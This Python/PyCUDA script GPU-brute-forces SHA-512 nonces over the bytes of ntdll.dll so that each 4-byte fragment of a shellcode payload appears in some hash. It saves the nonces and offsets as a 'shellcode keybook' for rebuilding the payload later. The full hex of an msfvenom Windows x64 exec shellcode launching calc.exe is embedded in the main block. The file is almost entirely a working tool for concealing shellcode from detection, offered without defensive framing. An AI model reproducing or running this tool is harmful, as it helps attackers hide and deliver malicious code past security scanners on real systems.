import os
import subprocess
import sys

def bootstrap_msvc_environment():
    """
    Silently loads the Visual Studio C++ environment variables into Python
    so PyCUDA can compile without needing the Native Tools command prompt.
    """
    vcvars_path = r"C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"

    if not os.path.exists(vcvars_path):
        print(f"[!] Critical: Cannot find vcvars64.bat at {vcvars_path}")
        sys.exit(1)

    print("[*] Bootstrapping MSVC Environment...")
    cmd = f'"{vcvars_path}" && set'
    popen = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    stdout, _ = popen.communicate()

    for line in stdout.decode('utf-8', errors='ignore').splitlines():
        if '=' in line:
            key, value = line.split('=', 1)
            os.environ[key] = value

# ==========================================
# 1. INITIALIZE ENVIRONMENT FIRST
# ==========================================
bootstrap_msvc_environment()

# ==========================================
# 2. IMPORT PYCUDA & DEPENDENCIES
# ==========================================
import json
import numpy as np
import pycuda.autoinit
import pycuda.driver as cuda
from pycuda.compiler import SourceModule

# ==========================================
# 3. THE HYPER-OPTIMIZED CUDA KERNEL
# ==========================================
CUDA_KERNEL = """
#include <stdint.h>

__constant__ uint64_t K[80] = {
    0x428a2f98d728ae22, 0x7137449123ef65cd, 0xb5c0fbcfec4d3b2f, 0xe9b5dba58189dbbc,
    0x3956c25bf348b538, 0x59f111f1b605d019, 0x923f82a4af194f9b, 0xab1c5ed5da6d8118,
    0xd807aa98a3030242, 0x12835b0145706fbe, 0x243185be4ee4b28c, 0x550c7dc3d5ffb4e2,
    0x72be5d74f27b896f, 0x80deb1fe3b1696b1, 0x9bdc06a725c71235, 0xc19bf174cf692694,
    0xe49b69c19ef14ad2, 0xefbe4786384f25e3, 0x0fc19dc68b8cd5b5, 0x240ca1cc77ac9c65,
    0x2de92c6f592b0275, 0x4a7484aa6ea6e483, 0x5cb0a9dcbd41fbd4, 0x76f988da831153b5,
    0x983e5152ee66dfab, 0xa831c66d2db43210, 0xb00327c898fb213f, 0xbf597fc7beef0ee4,
    0xc6e00bf33da88fc2, 0xd5a79147930aa725, 0x06ca6351e003826f, 0x142929670a0e6e70,
    0x27b70a8546d22ffc, 0x2e1b21385c26c926, 0x4d2c6dfc5ac42aed, 0x53380d139d95b3df,
    0x650a73548baf63de, 0x766a0abb3c77b2a8, 0x81c2c92e47edaee6, 0x92722c851482353b,
    0xa2bfe8a14cf10364, 0xa81a664bbc423001, 0xc24b8b70d0f89791, 0xc76c51a30654be30,
    0xd192e819d6ef5218, 0xd69906245565a910, 0xf40e35855771202a, 0x106aa07032bbd1b8,
    0x19a4c116b8d2d0c8, 0x1e376c085141ab53, 0x2748774cdf8eeb99, 0x34b0bcb5e19b48a8,
    0x391c0cb3c5c95a63, 0x4ed8aa4ae3418acb, 0x5b9cca4f7763e373, 0x682e6ff3d6b2b8a3,
    0x748f82ee5defb2fc, 0x78a5636f43172f60, 0x84c87814a1f0ab72, 0x8cc702081a6439ec,
    0x90befffa23631e28, 0xa4506cebde82bde9, 0xbef9a3f7b2c67915, 0xc67178f2e372532b,
    0xca273eceea26619c, 0xd186b8c721c0c207, 0xeada7dd6cde0eb1e, 0xf57d4f7fee6ed178,
    0x06f067aa72176fba, 0x0a637dc5a2c898a6, 0x113f9804bef90dae, 0x1b710b35131c471b,
    0x28db77f523047d84, 0x32caab7b40c72493, 0x3c9ebe0a15c9bebc, 0x431d67c49c100d4c,
    0x4cc5d4becb3e42b6, 0x597f299cfc657e2a, 0x5fcb6fab3ad6faec, 0x6c44198c4a475817
};

#define ROTR(x, n) (((x) >> (n)) | ((x) << (64 - (n))))
#define Ch(x, y, z) (((x) & (y)) ^ (~(x) & (z)))
#define Maj(x, y, z) (((x) & (y)) ^ ((x) & (z)) ^ ((y) & (z)))
#define Sigma0(x) (ROTR(x, 28) ^ ROTR(x, 34) ^ ROTR(x, 39))
#define Sigma1(x) (ROTR(x, 14) ^ ROTR(x, 18) ^ ROTR(x, 41))
#define sigma0(x) (ROTR(x, 1) ^ ROTR(x, 8) ^ ((x) >> 7))
#define sigma1(x) (ROTR(x, 19) ^ ROTR(x, 61) ^ ((x) >> 6))

__device__ void sha512_transform(uint64_t *state, const unsigned char *data) {
    uint64_t W[80];
    uint64_t a, b, c, d, e, f, g, h, t1, t2;
    int i;

    for (i = 0; i < 16; ++i) {
        W[i] = ((uint64_t)data[i*8] << 56) | ((uint64_t)data[i*8+1] << 48) |
               ((uint64_t)data[i*8+2] << 40) | ((uint64_t)data[i*8+3] << 32) |
               ((uint64_t)data[i*8+4] << 24) | ((uint64_t)data[i*8+5] << 16) |
               ((uint64_t)data[i*8+6] << 8)  | ((uint64_t)data[i*8+7]);
    }

    for (i = 16; i < 80; ++i) {
        W[i] = sigma1(W[i-2]) + W[i-7] + sigma0(W[i-15]) + W[i-16];
    }

    a = state[0]; b = state[1]; c = state[2]; d = state[3];
    e = state[4]; f = state[5]; g = state[6]; h = state[7];

    for (i = 0; i < 80; ++i) {
        t1 = h + Sigma1(e) + Ch(e, f, g) + K[i] + W[i];
        t2 = Sigma0(a) + Maj(a, b, c);
        h = g; g = f; f = e; e = d + t1;
        d = c; c = b; b = a; a = t1 + t2;
    }

    state[0] += a; state[1] += b; state[2] += c; state[3] += d;
    state[4] += e; state[5] += f; state[6] += g; state[7] += h;
}

__device__ int u64_to_str(uint64_t val, char* buf) {
    if (val == 0) { buf[0] = '0'; return 1; }
    int len = 0;
    uint64_t temp = val;
    while (temp > 0) { len++; temp /= 10; }
    for (int i = len - 1; i >= 0; i--) {
        buf[i] = '0' + (val % 10);
        val /= 10;
    }
    return len;
}

extern "C" {
    // 1. PRE-COMPUTE KERNEL: Hashes the 5120-byte seed exactly once
    __global__ void precompute_midstate(const unsigned char* seed, int seed_length, uint64_t* out_midstate) {
        if (threadIdx.x != 0 || blockIdx.x != 0) return; 

        uint64_t state[8] = {
            0x6a09e667f3bcc908, 0xbb67ae8584caa73b, 0x3c6ef372fe94f82b, 0xa54ff53a5f1d36f1,
            0x510e527fade682d1, 0x9b05688c2b3e6c1f, 0x1f83d9abfb41bd6b, 0x5be0cd19137e2179
        };

        unsigned char block[128];
        int block_idx = 0;

        for (int i = 0; i < seed_length; i++) {
            block[block_idx++] = seed[i];
            if (block_idx == 128) { 
                sha512_transform(state, block); 
                block_idx = 0; 
            }
        }

        for (int i = 0; i < 8; i++) {
            out_midstate[i] = state[i];
        }
    }

    // 2. MINING KERNEL: Bypasses the seed and only hashes the nonce
    __global__ void mine_collision(
        const uint64_t* precomputed_state, 
        int seed_length, 
        const char* target_hex, 
        int target_length, 
        uint64_t start_nonce, 
        uint64_t* result_nonce, 
        int* result_offset, 
        int* found_flag
    ) {
        uint64_t thread_id = blockIdx.x * blockDim.x + threadIdx.x;
        uint64_t current_nonce = start_nonce + thread_id;

        if (*found_flag == 1) return;

        char nonce_str[24];
        int nonce_len = u64_to_str(current_nonce, nonce_str);

        uint64_t state[8];
        for (int i = 0; i < 8; i++) {
            state[i] = precomputed_state[i];
        }

        unsigned char block[128];
        int block_idx = 0;
        uint64_t total_bits = (seed_length + nonce_len) * 8;

        for (int i = 0; i < nonce_len; i++) {
            block[block_idx++] = nonce_str[i];
        }

        // Standard SHA-512 Padding
        block[block_idx++] = 0x80;
        while (block_idx < 112) block[block_idx++] = 0; // Stop padding at byte 112

        // Append length (Strict Big Endian 128-bit field)
        for (int i = 0; i < 8; i++) { block[112 + i] = 0; } 
        for (int i = 0; i < 8; i++) { block[120 + i] = (total_bits >> (56 - (i * 8))) & 0xFF; }

        // THE MISSING ENGINE: Actually process the final block into the hash
        sha512_transform(state, block);

        // Convert resulting hash to hex representation
        char hex_out[128];
        const char hex_chars[] = "0123456789abcdef";
        for (int i = 0; i < 8; i++) {
            for (int j = 0; j < 8; j++) {
                unsigned char byte = (state[i] >> (56 - (j * 8))) & 0xFF;
                hex_out[(i * 16) + (j * 2)] = hex_chars[byte >> 4];
                hex_out[(i * 16) + (j * 2) + 1] = hex_chars[byte & 0x0F];
            }
        }

        // Substring Match
        int match_offset = -1;
        for (int i = 0; i <= 128 - target_length; i++) {
            bool match = true;
            for (int j = 0; j < target_length; j++) {
                if (hex_out[i + j] != target_hex[j]) { match = false; break; }
            }
            if (match) { match_offset = i; break; }
        }

        // Atomic write on match
        if (match_offset != -1) {
            if (atomicCAS(found_flag, 0, 1) == 0) {
                *result_nonce = current_nonce;
                *result_offset = match_offset;
            }
        }
    }
}
"""

# ==========================================
# 4. PYTHON ORCHESTRATION LOGIC
# ==========================================
def get_local_entropy(file_path):
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"Entropy source not found: {file_path}")
    with open(file_path, "rb") as f:
        return f.read(5120)

def chunk_hex_payload(hex_string, hex_chunk_size=10):
    clean_hex = hex_string.replace("\\x", "").replace("0x", "").replace(" ", "").lower()
    return [clean_hex[i:i + hex_chunk_size] for i in range(0, len(clean_hex), hex_chunk_size)]

def mine_gpu_sequence(source_path, target_hex_list, output_file="gpu_shellcode_keybook.json"):
    print("[*] Compiling CUDA Kernel JIT...")
    mod = SourceModule(CUDA_KERNEL, no_extern_c=True, options=["-O3"])
    precompute_midstate = mod.get_function("precompute_midstate")
    mine_collision = mod.get_function("mine_collision")

    seed = get_local_entropy(source_path)
    d_seed = cuda.mem_alloc(len(seed))
    cuda.memcpy_htod(d_seed, seed)

    print("[*] Pre-computing SHA-512 Midstate for the Seed...")
    d_midstate = cuda.mem_alloc(8 * 8)
    precompute_midstate(d_seed, np.int32(len(seed)), d_midstate, block=(1, 1, 1), grid=(1, 1))

    keybook = []

    # RTX 3090 Tuning
    threads_per_block = 512
    blocks_per_grid = 65535
    batch_size = threads_per_block * blocks_per_grid

    for target_hex in target_hex_list:
        print(f"[*] GPU Mining for Hex Fragment: '{target_hex}'")

        target_bytes = target_hex.encode('utf-8')
        d_target = cuda.mem_alloc(len(target_bytes))
        cuda.memcpy_htod(d_target, target_bytes)

        h_found_flag = np.zeros(1, dtype=np.int32)
        h_result_nonce = np.zeros(1, dtype=np.uint64)
        h_result_offset = np.zeros(1, dtype=np.int32)

        d_found_flag = cuda.mem_alloc(h_found_flag.nbytes)
        d_result_nonce = cuda.mem_alloc(h_result_nonce.nbytes)
        d_result_offset = cuda.mem_alloc(h_result_offset.nbytes)

        current_start = np.uint64(0)
        found = False
        cuda.memcpy_htod(d_found_flag, h_found_flag)

        while not found:
            mine_collision(
                d_midstate, np.int32(len(seed)),
                d_target, np.int32(len(target_bytes)),
                current_start,
                d_result_nonce, d_result_offset, d_found_flag,
                block=(threads_per_block, 1, 1),
                grid=(blocks_per_grid, 1)
            )

            cuda.memcpy_dtoh(h_found_flag, d_found_flag)

            if h_found_flag[0] == 1:
                cuda.memcpy_dtoh(h_result_nonce, d_result_nonce)
                cuda.memcpy_dtoh(h_result_offset, d_result_offset)

                keybook.append({
                    "n": int(h_result_nonce[0]),
                    "o": int(h_result_offset[0]),
                    "l": len(target_hex)
                })
                print(f"    [+] MATCH: Nonce {h_result_nonce[0]} at Offset {h_result_offset[0]}")
                found = True
            else:
                current_start += np.uint64(batch_size)

    with open(output_file, 'w') as f:
        json.dump({"s": source_path, "keys": keybook}, f, indent=4)
    print(f"\n[!] GPU Shellcode Keybook saved to {output_file}")


if __name__ == '__main__':
    source_file = r"C:\Windows\System32\ntdll.dll"

    # Full Payload: MSFvenom windows/x64/exec CMD=calc.exe EXITFUNC=thread (276 bytes)
    calc_shellcode_hex = (
        "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b52"
        "20488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed"
        "524151488b52208b423c4801d08b80880000004885c074674801d0508b481844"
        "8b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c1"
        "38e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c49"
        "01d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841"
        "595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b"
        "6f87ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb47"
        "13726f6a00594189daffd563616c632e65786500"
    )

    # Chunking at 8 hex chars (4 bytes)
    hex_targets = chunk_hex_payload(calc_shellcode_hex, hex_chunk_size=8)
    mine_gpu_sequence(source_file, hex_targets)